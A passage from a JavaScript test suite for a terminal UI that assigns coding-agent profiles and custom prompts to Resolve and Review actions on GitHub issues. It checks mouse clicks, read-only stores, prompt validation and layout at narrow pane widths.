  for (const m of frame.matchAll(/\x1b\[(\d+);1H(.*?)\x1b\[0m\x1b\[K/g)) lines[m[1] - 1] = strip(m[2]);
  return lines;
}
// Where a button's label sits on the screen: [x, y].
const find = (lines, label) => {
  const y = lines.findIndex((l) => l?.includes(label));
  return [lines[y]?.indexOf(label), y];
};

test("a store with a profile it can't use is read only, so saving doesn't erase that profile", (t) => {
  const dir = home(t);
  const file = useProfiles(dir, [
    { id: "good", name: "Good", harness: "pi" },
    { id: "bad", name: "Bad", harness: "claude", model: "opus[1m]" },
  ], { resolve: "bad" });
  const before = fs.readFileSync(file, "utf8");
  setupGitHub("issues");
  let shown = screen(() => onInput(Buffer.from("s")));
  assert.ok(text(shown).includes("read only here"), shown.join("\n"));
  assert.ok(text(shown).includes('Skipped profile "bad"'), shown.join("\n"));
  shown = screen(() => onInput(Buffer.from("jR")));
  assert.ok(text(shown).includes("Not saved: Some profiles in the file can't be used"), shown.join("\n"));
  screen(() => onInput(Buffer.from("dy")));
  screen(() => onInput(Buffer.from("n")));
  screen(() => onInput(Buffer.from("New\x1b[Bnew\r")));
  assert.equal(fs.readFileSync(file, "utf8"), before);
});

test("the selected profile has buttons, the header a + New, and the form a Save", (t) => {
  claudeHome(t);
  setupGitHub("issues");
  let lines = screen(() => onInput(Buffer.from("s")));
  // The default is selected: it can be assigned, not edited or deleted.
  assert.match(lines.join("\n"), / Use for Resolve {3}Use for Review \n/);
  assert.ok(!lines.some((l) => /Edit |Delete /.test(l ?? "")), lines.join("\n"));
  let [x, y] = find(lines, "Use for Resolve");
  lines = screen(() => click(x + 1, y));
  assert.deepEqual(JSON.parse(fs.readFileSync(storeFile(), "utf8")).assign, { resolve: null, review: "cc" });
  assert.ok(text(lines).includes("Resolve now starts Claude Code via mcc run"), lines.join("\n"));
  // cc: assigned to Review, so that one shows ✓; Edit opens the form.
  lines = screen(() => onInput(Buffer.from("j")));
  assert.match(lines.join("\n"), / Use for Resolve {3}Review ✓ {3}Edit {3}Delete \n/);
  [x, y] = find(lines, "Edit ");
  lines = screen(() => click(x + 1, y));
  assert.equal(ui.settings.mode, "edit");
  assert.equal(ui.settings.form.prev, "cc");
  // The form's Save saves, as enter does.
  screen(() => onInput(Buffer.from("!")));
  lines = screen(draw);
  [x, y] = find(lines, " Save ");
  lines = screen(() => click(x + 2, y));
  assert.equal(ui.settings.mode, "list");
  assert.equal(JSON.parse(fs.readFileSync(storeFile(), "utf8")).profiles[0].name, "Claude Code!");
  // Delete asks first, with buttons: Keep keeps it, Delete deletes it.
  [x, y] = find(lines, "Delete ");
  lines = screen(() => click(x + 1, y));
  assert.equal(ui.settings.mode, "confirm");
  assert.match(lines.join("\n"), / Delete {3}Keep \n/);
  [x, y] = find(lines, " Keep ");
  lines = screen(() => click(x + 1, y));
  assert.equal(JSON.parse(fs.readFileSync(storeFile(), "utf8")).profiles.length, 1);
  [x, y] = find(lines, "Delete ");
  lines = screen(() => click(x + 1, y));
  [x, y] = find(lines, " Delete ");
  lines = screen(() => click(x + 1, y));
  assert.equal(JSON.parse(fs.readFileSync(storeFile(), "utf8")).profiles.length, 0);
  assert.equal(ui.settings.sel, 0);
  // + New in the header opens an empty form; ✕ stays at the right edge.
  assert.match(lines[0], /\+ New {2}✕ $/);
  lines = screen(() => click(lines[0].indexOf("+ New"), 0));
  assert.equal(ui.settings.mode, "edit");
  assert.equal(ui.settings.form.prev, null);
  assert.doesNotMatch(lines[0], /\+ New/);
});

test("the profiles footer goes onto two lines when it doesn't fit, rather than being cut", (t) => {
  claudeHome(t);
  setupGitHub("issues");
  for (const cols of [60, 40]) {
    let lines = screenAt(cols, 24, () => { ui.settings = null; onInput(Buffer.from("s")); });
    for (const l of lines) assert.ok(width(l ?? "") <= cols, `${cols}: ${l}`);
    let foot = lines.slice(-2).join(" ");
    for (const hint of ["↑↓ select", "n new", "e edit", "d delete", "R/V assign", "esc back"]) assert.ok(foot.includes(hint), `${cols}: ${foot}`);
    assert.ok(!foot.includes("…"), foot);
    lines = screenAt(cols, 24, () => onInput(Buffer.from("n")));
    for (const l of lines) assert.ok(width(l ?? "") <= cols, `${cols}: ${l}`);
    foot = lines.slice(-2).join(" ");
    for (const hint of ["↑↓ field", "⏎ save", "esc back"]) assert.ok(foot.includes(hint), `${cols}: ${foot}`);
    screenAt(cols, 24, () => onInput(Buffer.from("\x1b")));
  }
  // Wide enough: one line.
  const lines = screenAt(100, 24, draw);
  assert.match(lines[23], /^ ↑↓ select · n new · e edit · d delete · R\/V assign · esc back/);
  assert.equal(lines[22], "");
});

test("the form names the id's rule, fits a narrow pane, and shows each field's reason under it", (t) => {
  claudeHome(t);
  setupGitHub("issues");
  screen(() => onInput(Buffer.from("s")));
  let lines = screen(() => onInput(Buffer.from("n")));
  // The id's rule is the empty field's hint, beside a short label.
  assert.ok(lines.some((l) => /^ {2}Id {7}a-z 0-9 -/.test(l ?? "")), lines.join("\n"));
  // Two bad fields: both reasons show, each under its own field.
  lines = screen(() => onInput(Buffer.from("\x1b[B\x1b[B\x1b[Bopus[1m]\r")));
  assert.equal(ui.settings.mode, "edit");
  const at = (label) => lines.findIndex((l) => l?.trimStart().replace(/^▌ /, "").startsWith(label));
  const name = at("Name"), id = at("Id"), model = at("Model");
  assert.ok(lines[name + 1].includes("Name: 1-40 printable characters"), lines.join("\n"));
  assert.ok(id > name + 1 && lines.slice(id + 1, at("Harness")).join(" ").includes("Id:"), lines.join("\n"));
  assert.ok(lines.slice(model + 1, at("Thinking")).join(" ").replace(/\s+/g, " ").includes("Model: letters, digits"), lines.join("\n"));
  for (const l of lines) assert.ok(width(l ?? "") <= 60, l);
  // Typing in a field takes its reason away.
  lines = screen(() => onInput(Buffer.from("\x7f")));
  assert.ok(!text(lines).includes("Model: letters"), lines.join("\n"));
  // A narrow pane puts a wide choice under its label, and cuts its name, not its ›.
  lines = screenAt(28, 24, () => onInput(Buffer.from("\x1b[B\x1b[B\x1b[B\x1b[B")));
  for (const l of lines) assert.ok(width(l ?? "") <= 28, l);
  const harness = lines.findIndex((l) => l?.includes("Harness"));
  assert.ok(!lines[harness].includes("‹"), lines.join("\n"));
  assert.match(lines[harness + 1], /^[▌ ] {2}‹ Claude Code via.*… ›$/, lines.join("\n"));
  // An empty form too, its placeholders included, and the key hints whole.
  lines = screenAt(28, 24, () => onInput(Buffer.from("\x1bn")));
  for (const l of lines) assert.ok(width(l ?? "") <= 28, l);
  assert.ok(text(lines.slice(-3)).endsWith("esc back"), lines.join("\n"));
});

test("at 30 and 40 cells the form shows each reason whole, and each choice with its ›", (t) => {
  claudeHome(t);
  setupGitHub("issues");
  const rules = {
    id: "Id: 1-32 lowercase letters, digits or -, not starting with -",
    model: "Model: letters, digits and . _ : / @ + - only, starting with a letter or digit",
  };
  for (const cols of [30, 40]) {
    screenAt(cols, 24, () => { ui.settings = null; onInput(Buffer.from("sn")); });
    let lines = screenAt(cols, 24, () => onInput(Buffer.from("\x1b[B\x1b[B\x1b[Bopus[1m]\r")));
    assert.equal(ui.settings.mode, "edit");
    for (const l of lines) assert.ok(width(l ?? "") <= cols, `${cols}: ${l}`);
    const all = text(lines).replace(/\s+/g, " ");
    for (const rule of Object.values(rules)) assert.ok(all.includes(rule), `${cols}:\n${lines.join("\n")}`);
    // Each reason under its own field, never cut.
    const at = (label) => lines.findIndex((l) => l?.trimStart().replace(/^▌ /, "").startsWith(label));
    assert.ok(text(lines.slice(at("Id") + 1, at("Harness"))).replace(/\s+/g, " ").includes(rules.id), lines.join("\n"));
    assert.ok(text(lines.slice(at("Model") + 1, at("Thinking"))).replace(/\s+/g, " ").includes(rules.model), lines.join("\n"));
    assert.ok(!lines.some((l) => /^ {4}\S/.test(l ?? "") && l.includes("…")), lines.join("\n"));
    // The harness and thinking choices whole, ending in ›.
    assert.ok(lines.some((l) => l?.trimEnd().endsWith("‹ Claude Code via mcc run ›")), `${cols}:\n${lines.join("\n")}`);
    assert.ok(lines.some((l) => l?.includes("Thinking") && l.trimEnd().endsWith("‹ harness default ›")), `${cols}:\n${lines.join("\n")}`);
    screenAt(cols, 24, () => onInput(Buffer.from("\x1b\x1b")));
  }
});

test("at 30 cells a profile keeps its name, its Resolve and Review tags move down, and notices wrap", (t) => {
  claudeHome(t);
  setupGitHub("issues");
  const cols = 30;
  let lines = screenAt(cols, 24, () => { ui.settings = null; onInput(Buffer.from("sj")); });
  for (const l of lines) assert.ok(width(l ?? "") <= cols, l);
  // cc, used by both: its whole name and id on top, the tags on the line under it.
  const y = lines.findIndex((l) => l?.includes("Claude Code") && l.trimEnd().endsWith("cc"));
  assert.ok(y > 0, lines.join("\n"));
  assert.match(lines[y + 1], /^▌ {3}Resolve · Review · Claude/, lines.join("\n"));
  // The confirm question and its keys, whole.
  lines = screenAt(cols, 24, () => onInput(Buffer.from("d")));
  for (const l of lines) assert.ok(width(l ?? "") <= cols, l);
  assert.ok(text(lines).includes("Delete Claude Code? y deletes it, any other key keeps it"), lines.join("\n"));
  assert.deepEqual(lines.slice(-2).map((l) => l.trim()), ["y delete", "any other key keeps it"]);
  assert.match(screenAt(60, 24, draw).at(-1), /^ y delete · any other key keeps it/);
  assert.ok(!text(lines.slice(-2)).includes("n new"), lines.join("\n"));
  // What a change did, whole.
  lines = screenAt(cols, 24, () => onInput(Buffer.from("nkV")));
  for (const l of lines) assert.ok(width(l ?? "") <= cols, l);
  assert.ok(text(lines).includes("Review now starts Claude Code via mcc run"), lines.join("\n"));
  // The default, used by both now: at 40 cells its name keeps 12 cells.
  lines = screenAt(40, 24, () => onInput(Buffer.from("R")));
  const d = lines.findIndex((l) => l?.includes("default"));
  assert.match(lines[d], /^▌ Claude Code via mcc run +default$/, lines.join("\n"));
  assert.match(lines[d + 1], /^▌ {3}Resolve · Review · Claude Code via/, lines.join("\n"));
  screenAt(cols, 24, () => onInput(Buffer.from("\x1b")));
});

test("launch notices name the harness, and lead with what to do", async (t) => {
  claudeHome(t, { ".claude/skills/issue-resolver/SKILL.md": "x" });
  setupGitHub("issues");
  const seen = [];
  fakeHerdr(claudeHere, { "pane split": () => { seen.push(ui.notice?.text); return ok({ pane: { pane_id: "w1:p7" } }); } });
  const started = await screenAsync(() => startWithMenu());
  assert.deepEqual(seen, ["Starting Claude Code to resolve issue #12…"]);
  assert.ok(text(started).includes("Started Claude Code in a new pane: /issue-resolver 12"), started.join("\n"));
  assert.ok(!text(started).includes("Started claude"), started.join("\n"));
  // mcc missing: the remedy first, the whole of it on screen.
  const dir = home(t, { ".claude/skills/issue-resolver/SKILL.md": "x" });
  assert.ok(dir);
  mccOnPath(t, false);
  setupGitHub("issues");
  const after = await screenAsync(() => onInput(Buffer.from("a")));
  assert.ok(text(after).includes("mcc isn't on your PATH: press s to pick another profile for Resolve, or install mcc."), after.join("\n"));
  // A long notice shows whole while the room allows it, above the key hints.
  ui.notice = { tone: "info", text: `${"word ".repeat(60)}end`, url: null };
  let lines = screen(draw);
  assert.equal(text(lines).match(/\bword\b/g).length, 60, lines.join("\n"));
  assert.ok(text(lines).includes("word end"), lines.join("\n"));
  assert.ok(!lines.some((l) => l?.startsWith(" word") && l.includes("…")), lines.join("\n"));
  assert.match(lines[23], /^ ↑↓ select/);
  // One too long for the room is cut there, ending in "…": the list keeps a line,
  // the URL under the message stays whole, and so do the key hints.
  ui.notice = { tone: "error", text: "word ".repeat(400), url: "https://x/install" };
  lines = screen(draw);
  assert.ok(!lines[4].startsWith(" word") && lines[5].startsWith("─"), lines.join("\n"));
  assert.ok(lines[21].endsWith("…"), lines.join("\n"));
  assert.equal(lines[22], " https://x/install");
  assert.match(lines[23], /^ ↑↓ select/);
});

// The same text, however a narrow pane broke it: a word too long for a line is
// split without a space.
const squash = (s) => s.replace(/\s+/g, "");
const shows = (lines, message) => squash(text(lines)).includes(squash(message));
// A 40-character name, the longest there is, with no space to break at.
const LONG_NAME = "Abcdefghijklmnopqrstuvwxyz0123456789ABCD";

test("at 28, 30 and 40 cells the profiles show each warning, note and question whole", (t) => {
  const dir = home(t);
  const note = "OpenCode ignores this profile's model and thinking level: it has no flag for them when it starts";
  for (const cols of [28, 30, 40]) {
    const at = (fn) => {
      const lines = screenAt(cols, 24, fn);
      for (const l of lines) assert.ok(width(l ?? "") <= cols, `${cols}: ${l}`);
      return lines;
    };
    // The OpenCode note, in the form, under an OpenCode profile with a model.
    useProfiles(dir, []);
    setupGitHub("issues");
    let lines = at(() => onInput(Buffer.from("sn\x1b[B\x1b[B\x1b[D\x1b[Bx")));
    assert.equal(ui.settings.form.harness, "opencode");
    assert.ok(shows(lines, note), `${cols}:\n${lines.join("\n")}`);
    assert.ok(lines.at(-1).trimEnd().endsWith("esc back"), `${cols}:\n${lines.join("\n")}`);
    at(() => onInput(Buffer.from("\x1b\x1b")));

    // A skipped profile: why the file is read only, and the rule it broke.
    useProfiles(dir, [{ id: "bad", name: "Bad", harness: "claude", model: "opus[1m]" }], { resolve: "bad" });
    setupGitHub("issues");
    lines = at(() => onInput(Buffer.from("s")));
    for (const w of [
      "Some profiles in the file can't be used (see below), so it is read only here: fix or remove them to save",
      'Skipped profile "bad": Model: letters, digits and . _ : / @ + - only, starting with a letter or digit',
      "The resolve action's profile isn't there, so it uses the default",
    ]) assert.ok(shows(lines, w), `${cols}: ${w}\n${lines.join("\n")}`);
    assert.ok(lines.at(-1).trimEnd().endsWith("esc back"), `${cols}:\n${lines.join("\n")}`);
    // And why a change isn't saved.
    lines = at(() => onInput(Buffer.from("R")));
    assert.ok(shows(lines, "Not saved: Some profiles in the file can't be used (see below), so it is read only here: fix or remove them to save"), `${cols}:\n${lines.join("\n")}`);
    assert.ok(lines.at(-1).trimEnd().endsWith("esc back"), `${cols}:\n${lines.join("\n")}`);
    at(() => onInput(Buffer.from("\x1b")));

    // A file from another version: 1 and 2 are read (2 since #20's prompts).
    fs.writeFileSync(useProfiles(dir, []), JSON.stringify({ version: 3, profiles: [], assign: {} }));
    setupGitHub("issues");
    lines = at(() => onInput(Buffer.from("s")));
    assert.ok(shows(lines, "The profiles file is version 3, not 1 or 2: it is read only here"), `${cols}:\n${lines.join("\n")}`);
    at(() => onInput(Buffer.from("\x1b")));

    // A 40-character name in what a change did, and in the delete question.
    useProfiles(dir, [{ id: "long", name: LONG_NAME, harness: "pi" }]);
    setupGitHub("issues");
    lines = at(() => onInput(Buffer.from("sjR")));
    assert.ok(shows(lines, `Resolve now starts ${LONG_NAME}`), `${cols}:\n${lines.join("\n")}`);
    lines = at(() => onInput(Buffer.from("d")));
    assert.ok(shows(lines, `Delete ${LONG_NAME}? y deletes it, any other key keeps it`), `${cols}:\n${lines.join("\n")}`);
    assert.ok(lines.at(-1).trimEnd().endsWith("any other key keeps it"), `${cols}:\n${lines.join("\n")}`);
    lines = at(() => onInput(Buffer.from("y")));
    assert.ok(shows(lines, `Deleted ${LONG_NAME}`), `${cols}:\n${lines.join("\n")}`);
    at(() => onInput(Buffer.from("\x1b")));
  }
});

test("at 28 and 30 cells the notice of a started OpenCode keeps its note whole", async (t) => {
  const dir = home(t, { ".agents/skills/issue-resolver/SKILL.md": "x" });
  for (const cols of [28, 30]) {
    useProfiles(dir, [{ id: "p", name: "P", harness: "opencode", model: "x" }], { resolve: "p" });
    setupGitHub("issues");
    fakeHerdr(claudeHere);
    // The menu first: it fits too, and keeps the key hints last.
    const menu = screenAt(cols, 24, () => onInput(Buffer.from("a")));
    assert.ok(ui.menu, `${cols}: a opened no menu`);
    for (const l of menu) assert.ok(width(l ?? "") <= cols, `${cols}: ${l}`);
    assert.ok(menu.some((l) => /│ ▸ P\b/.test(l ?? "")), `${cols}:\n${menu.join("\n")}`);
    // Too narrow for the full key hints: the short ones, esc still in view.
    assert.equal(menu[23].trimEnd(), " ↑↓ · ⏎ start · esc cancel", `${cols}:\n${menu.join("\n")}`);
    const lines = await screenAsync(() => onInput(Buffer.from("\r")), cols);
    const whole = "Started OpenCode in a new pane: Use the issue-resolver skill on issue #12. " +
      "(OpenCode ignores this profile's model and thinking level: it has no flag for them when it starts)";
    assert.ok(shows(lines, whole), `${cols}:\n${lines.join("\n")}`);
    for (const l of lines) assert.ok(width(l ?? "") <= cols, `${cols}: ${l}`);
    // The list's key hints, t and the interval first in a pane this narrow (#47).
    assert.match(lines[23], /^ t 1m · ↑↓ select/);
  }
});

// A frame of `rows` lines, none wider than `cols`, whose last lines are `footer`'s
// key hints in full: paint drops lines from the bottom, so they come last.
function fitsWithHints(lines, cols, rows, first, last) {
  const shown = `${cols}x${rows}:\n${lines.join("\n")}`;
  assert.equal(lines.length, rows, shown);
  for (const l of lines) assert.ok(width(l ?? "") <= cols, `${shown}\n${l}`);
  assert.ok(lines.at(-1).trimEnd().endsWith(last), shown);
  assert.ok(lines.slice(-3).some((l) => l.startsWith(` ${first}`)), shown);
}
// The status line right above the key hints.
const aboveHints = (lines, first) => lines[lines.findIndex((l) => l?.startsWith(` ${first}`)) - 1];

test("the profiles keep their key hints however much there is to say, and cut it with …", (t) => {
  const dir = home(t);
  const notSaved = "Not saved: Some profiles in the file can't be used (see below), so it is read only here: fix or remove them to save";
  // Three profiles it can't use, Resolve on one: their warnings fill a 24-row pane.
  const bad = [0, 1, 2].map((i) => ({ id: `bad${i}`, name: `Bad ${i}`, harness: "claude", model: "opus[1m]" }));
  for (const cols of [28, 30]) {
    useProfiles(dir, bad, { resolve: "bad0" });
    setupGitHub("issues");
    let lines = screenAt(cols, 24, () => onInput(Buffer.from("s")));
    fitsWithHints(lines, cols, 24, "↑↓ select", "esc back");
    assert.ok(text(lines).includes('Skipped profile "bad0"'), lines.join("\n"));
    assert.ok(aboveHints(lines, "↑↓ select").endsWith("…"), lines.join("\n"));
    // Why R saved nothing comes first, whole; the warnings under it are cut.
    lines = screenAt(cols, 24, () => onInput(Buffer.from("R")));
    fitsWithHints(lines, cols, 24, "↑↓ select", "esc back");
    assert.ok(shows(lines, notSaved), `${cols}:\n${lines.join("\n")}`);
    assert.ok(text(lines).includes('Skipped profile "bad0"'), lines.join("\n"));
    assert.ok(aboveHints(lines, "↑↓ select").endsWith("…"), lines.join("\n"));
    screenAt(cols, 24, () => onInput(Buffer.from("\x1b")));
  }
  // One it can't use, on a short pane: the key hints whole, why R saved nothing
  // first, and the warnings after it cut where the room ends.
  for (const [cols, rows] of [[30, 16], [40, 12]]) {
    useProfiles(dir, [bad[0]], { resolve: "bad0" });
    setupGitHub("issues");
    screenAt(cols, rows, () => onInput(Buffer.from("s")));
    const lines = screenAt(cols, rows, () => onInput(Buffer.from("R")));
    fitsWithHints(lines, cols, rows, "↑↓ select", "esc back");
    assert.ok(shows(lines, notSaved), `${cols}x${rows}:\n${lines.join("\n")}`);
    assert.ok(aboveHints(lines, "↑↓ select").endsWith("…"), `${cols}x${rows}:\n${lines.join("\n")}`);
    screenAt(cols, rows, () => onInput(Buffer.from("\x1b")));
  }
  // The OpenCode form on a 28x10 pane: the field, the note cut, the key hints whole.
  useProfiles(dir, []);
  setupGitHub("issues");
  const lines = screenAt(28, 10, () => onInput(Buffer.from("sn\x1b[B\x1b[B\x1b[D\x1b[Bx")));
  assert.equal(ui.settings.form.harness, "opencode");
  fitsWithHints(lines, 28, 10, "↑↓ field", "esc back");
  assert.ok(lines.some((l) => l?.startsWith("▌ Model")), lines.join("\n"));
  assert.ok(text(lines).includes("OpenCode ignores"), lines.join("\n"));
  assert.ok(aboveHints(lines, "↑↓ field").endsWith("…"), lines.join("\n"));
  screenAt(28, 10, () => onInput(Buffer.from("\x1b\x1b")));
});

test("on a short pane a failed open keeps the whole URL, before its reason", () => {
  setup("prs");
  const url = "https://github.com/luongnv89/herdr-github/issues/12";
  ui.prs[0].url = url;
  // 30x9: three lines for the notice, all the URL's.
  let lines = screenAt(30, 9, () => { onInput(Buffer.from("\r")); lastChild.emit("exit", 3, null); });
  assert.deepEqual(opened, [url]);
  fitsWithHints(lines, 30, 9, "↑↓ select", "…");
  assert.ok(shows(lines, url), lines.join("\n"));
  assert.ok(!text(lines).includes(`${lastChild.cmd} exited 3`), lines.join("\n"));
  // With room for the reason too, it sits above the URL.
  lines = screenAt(30, 11, draw);
  assert.ok(shows(lines, url), lines.join("\n"));
  assert.ok(text(lines).includes(`${lastChild.cmd} exited 3`), lines.join("\n"));
  assert.match(lines[10], /^ ↑↓ select/);
});

test("the profiles view sets, changes and clears each action's prompt, under the profiles", async (t) => {
  claudeHome(t);
  setupGitHub("issues");
  const stored = () => JSON.parse(fs.readFileSync(storeFile(), "utf8"));
  let lines = screen(() => onInput(Buffer.from("s")));
  // Under the profiles, each prompt row shows the default it sends.
  const at = (label) => lines.findIndex((l) => l?.replace(/^[▌ ] /, "").startsWith(label));
  assert.ok(at("Resolve prompt") > lines.findIndex((l) => l?.includes("cc · Resolve · Review")), lines.join("\n"));
  assert.equal(lines[at("Resolve prompt") + 1].trim(), "default: /issue-resolver {number}");
  assert.equal(lines[at("Review prompt") + 1].trim(), "default: /issue-pr-review {number}");
  // ↓ past the last profile selects the Resolve prompt; e edits it.
  lines = screen(() => onInput(Buffer.from("jj")));
  assert.equal(ui.settings.promptSel, "resolve");
  assert.match(lines[at("Resolve prompt")], /^▌ Resolve prompt +Edit $/);
  lines = screen(() => onInput(Buffer.from("e")));
  assert.equal(ui.settings.mode, "prompt");
  assert.match(lines[0], /^ Resolve prompt +✕ $/);
  assert.ok(text(lines).includes("Sent as written to every harness, instead of the IDD skill. Empty sends the default."), lines.join("\n"));
  // The same key hints as the form's, no new ones.
  assert.equal(lines.at(-1).trim(), "type to edit · ⏎ save · esc back");
  // In it, q, j and s are text; enter saves, trimmed.
  const exit = noExit(() => screen(() => onInput(Buffer.from("  Fix #{number}: quick, safe, don't merge  "))));
  assert.equal(exit, null);
  // Control keys aren't typed into it.
  screen(() => onInput(Buffer.from("\t\x01\x1b[C\x1b[A\x1b[B")));
  assert.equal(ui.settings.prompt.text, "  Fix #{number}: quick, safe, don't merge  ");
  lines = screen(() => onInput(Buffer.from("\r")));
  assert.equal(ui.settings.mode, "list");
  assert.deepEqual(stored(), {
    version: 2, profiles: [{ id: "cc", name: "Claude Code", harness: "claude" }], assign: { resolve: "cc", review: "cc" },
    prompts: { resolve: "Fix #{number}: quick, safe, don't merge", review: null },
  });
  assert.ok(text(lines).includes("Resolve now sends: Fix #{number}: quick, safe, don't merge"), lines.join("\n"));
  assert.equal(lines[at("Resolve prompt") + 1].slice(1).trim(), "Fix #{number}: quick, safe, don't merge");
  // Without {number}, or with a backslash, it isn't saved: the reason shows under the text.
  lines = screen(() => onInput(Buffer.from("e\x7f".concat("\x7f".repeat(60), "Fix it\\\r"))));
  assert.equal(ui.settings.mode, "prompt");
  assert.equal(ui.settings.prompt.text, "Fix it\\");
  const why = text(lines.slice(3, lines.findIndex((l) => l?.includes("becomes the issue's number"))));
  assert.ok(why.includes("Resolve prompt: must contain {number}, where the number goes; Resolve prompt: no control, invisible or private-use characters, line breaks or backslashes"), lines.join("\n"));
  assert.equal(stored().prompts.resolve, "Fix #{number}: quick, safe, don't merge");
  // Typing takes the reason away; esc goes back without saving.
  lines = screen(() => onInput(Buffer.from("\x7f")));
  assert.ok(!text(lines).includes("must contain"), lines.join("\n"));
  screen(() => onInput(Buffer.from("\x1b")));
  assert.equal(ui.settings.mode, "list");
  assert.equal(stored().prompts.resolve, "Fix #{number}: quick, safe, don't merge");
  // R, V and d act on profiles only.
  lines = screen(() => onInput(Buffer.from("R")));
  assert.ok(text(lines).includes("The Resolve prompt isn't a profile: e or enter edits it"), lines.join("\n"));
  assert.deepEqual(stored().assign, { resolve: "cc", review: "cc" });
  // The Review prompt, by enter; then the Resolve one emptied: the default again.
  screen(() => onInput(Buffer.from("j\rReview #{number}\r")));
  assert.deepEqual(stored().prompts, { resolve: "Fix #{number}: quick, safe, don't merge", review: "Review #{number}" });
  lines = screen(() => onInput(Buffer.from("k\r".concat("\x7f".repeat(60), "\r"))));
  assert.ok(text(lines).includes("Resolve now sends the default: /issue-resolver {number}"), lines.join("\n"));
  assert.deepEqual(stored().prompts, { resolve: null, review: "Review #{number}" });
  // Both cleared: version 1 again, with no prompts key.
  screen(() => onInput(Buffer.from("j\r".concat("\x7f".repeat(20), "\r"))));
  assert.deepEqual(stored(), { version: 1, profiles: [{ id: "cc", name: "Claude Code", harness: "claude" }], assign: { resolve: "cc", review: "cc" } });
  // ↑ from the prompts goes back to the last profile.
  screen(() => onInput(Buffer.from("kk")));
  assert.equal(ui.settings.promptSel, null);
  assert.equal(ui.settings.sel, 1);
});

test("the prompt rows work with the mouse: a click selects, Edit edits, Use default clears", (t) => {
  const dir = claudeHome(t);
  usePrompts(dir, { review: "Review #{number}" }, [{ id: "cc", name: "Claude Code", harness: "claude" }], { resolve: "cc", review: "cc" });
  setupGitHub("prs");
  let lines = screen(() => onInput(Buffer.from("s")));
  let [x, y] = find(lines, "Review prompt");
  lines = screen(() => click(x, y));
  assert.equal(ui.settings.mode, "list", "a click on the row only selects it");
  assert.equal(ui.settings.promptSel, "review");
  // Selected, it still only selects, where the list's clicks land.
  [x, y] = find(lines, "Review prompt");
  for (const cx of [2, 4, 8]) {
    lines = screen(() => click(cx, y));
    assert.equal(ui.settings.mode, "list", `a click at ${cx} on the selected row opened its editor`);
  }
  [x, y] = find(lines, " Edit ");
  assert.equal(lines[y].trim().replace(/ +/g, " "), "▌ Review prompt Edit");
  lines = screen(() => click(x + 1, y));
  assert.equal(ui.settings.mode, "prompt");
  assert.equal(ui.settings.prompt.text, "Review #{number}");
  assert.match(lines.join("\n"), / Save {3}Use default {3}Cancel \n/);
  [x, y] = find(lines, "Use default");
  lines = screen(() => click(x, y));
  assert.equal(ui.settings.mode, "list");
  assert.equal(JSON.parse(fs.readFileSync(storeFile(), "utf8")).version, 1);
  // A click on a profile selects it again, with its own buttons.
  [x, y] = find(lines, "cc · Resolve");
  lines = screen(() => click(x, y));
  assert.equal(ui.settings.promptSel, null);
  assert.match(lines.join("\n"), / Resolve ✓ {3}Review ✓ {3}Edit /);
  // With no custom prompt there is no Use default; Cancel goes back.
  lines = screen(() => onInput(Buffer.from("jje")));
  assert.match(lines.join("\n"), / Save {3}Cancel \n/);
  [x, y] = find(lines, "Cancel");
  screen(() => click(x, y));
  assert.equal(ui.settings.mode, "list");
});

test("a prompt is not saved to a read-only or changed store, and fits a narrow pane", (t) => {
  const dir = home(t);
  // A hand-edited prompt it can't use: the file is read only, the row shows the default.
  const file = usePrompts(dir, { resolve: "no number" });
  const before = fs.readFileSync(file, "utf8");
  setupGitHub("issues");
  let lines = screen(() => onInput(Buffer.from("s")));
  assert.ok(text(lines).includes("A prompt in the file can't be used (see below), so it is read only here: fix or remove it to save"), lines.join("\n"));
  assert.ok(text(lines).includes("Skipped the Resolve prompt: must contain {number}, where the number goes"), lines.join("\n"));
  lines = screen(() => onInput(Buffer.from("j\rGo {number}\r")));
  assert.equal(ui.settings.mode, "prompt");
  assert.ok(text(lines).includes("Not saved: A prompt in the file can't be used"), lines.join("\n"));
  assert.equal(fs.readFileSync(file, "utf8"), before);
  screen(() => onInput(Buffer.from("\x1b\x1b")));
  // Changed elsewhere meanwhile: not overwritten, read again.
  usePrompts(dir, { resolve: "Mine {number}" });
  setupGitHub("issues");
  screen(() => onInput(Buffer.from("sj\rX")));
  const theirs = JSON.stringify({ version: 2, profiles: [], assign: {}, prompts: { resolve: "Theirs {number}" } });
  fs.writeFileSync(file, theirs);
  lines = screen(() => onInput(Buffer.from("\r")));
  assert.equal(fs.readFileSync(file, "utf8"), theirs);
  assert.ok(text(lines).includes("changed elsewhere"), lines.join("\n"));
  screen(() => onInput(Buffer.from("\x1b\x1b")));
  // At 28, 30 and 40 cells: every line fits, the row and the reason whole, the key hints last.
  for (const cols of [28, 30, 40]) {
    useProfiles(dir, []);
    setupGitHub("issues");
    lines = screenAt(cols, 24, () => onInput(Buffer.from("sj")));
    fitsWithHints(lines, cols, 24, "↑↓ select", "esc back");
    assert.ok(lines.some((l) => /^▌ Resolve prompt +Edit $/.test(l)), `${cols}:\n${lines.join("\n")}`);
    lines = screenAt(cols, 24, () => onInput(Buffer.from(`\r${"word ".repeat(30)}\\\r`)));
    fitsWithHints(lines, cols, 24, "type to edit", "esc back");
    // The whole text, broken over lines that each start with the bar.
    assert.ok(shows(lines.map((l) => l.replace(/^▌/, "")), `${"word ".repeat(30)}\\`), `${cols}:\n${lines.join("\n")}`);
    assert.ok(shows(lines, "Resolve prompt: must contain {number}"), `${cols}:\n${lines.join("\n")}`);
    screenAt(cols, 24, () => onInput(Buffer.from("\x1b\x1b")));
  }
});

// A short pane, at the narrowest widths: the prompt being edited keeps its end in
// view, the line you type on and its reason, rather than its start.
test("a prompt being edited keeps the line you type on and its reason in view in a short pane", (t) => {
  const dir = home(t);
  const reasons = {
    [`${"word ".repeat(40)}ZZEND`]: "Resolve prompt: must contain {number}, where the number goes",
    [`-${"word ".repeat(60)}ZZEND`]: "Resolve prompt: must contain {number}, where the number goes; Resolve prompt: can't start with -, ! or #",
  };
  for (const cols of [28, 30, 40]) for (const rows of [8, 10, 12, 16]) for (const [typed, reason] of Object.entries(reasons)) {
    useProfiles(dir, []);
    setupGitHub("issues");
    const at = (keys) => screenAt(cols, rows, () => onInput(Buffer.from(keys)));
    at("sj");
    let lines = at(`\r${typed}\r`);
    const shown = `${cols}x${rows}:\n${lines.join("\n")}`;
    assert.equal(ui.settings.mode, "prompt", shown);
    fitsWithHints(lines, cols, rows, "type to edit", "esc back");
    // The line you type on, with the end of what you typed.
    assert.ok(lines.some((l) => /^▌ .*ZZEND $/.test(l)), shown);
    // The reason, from its start: whole, or cut where the room ends, with "…".
    const why = lines.filter((l) => /^ {4}\S/.test(l ?? ""));
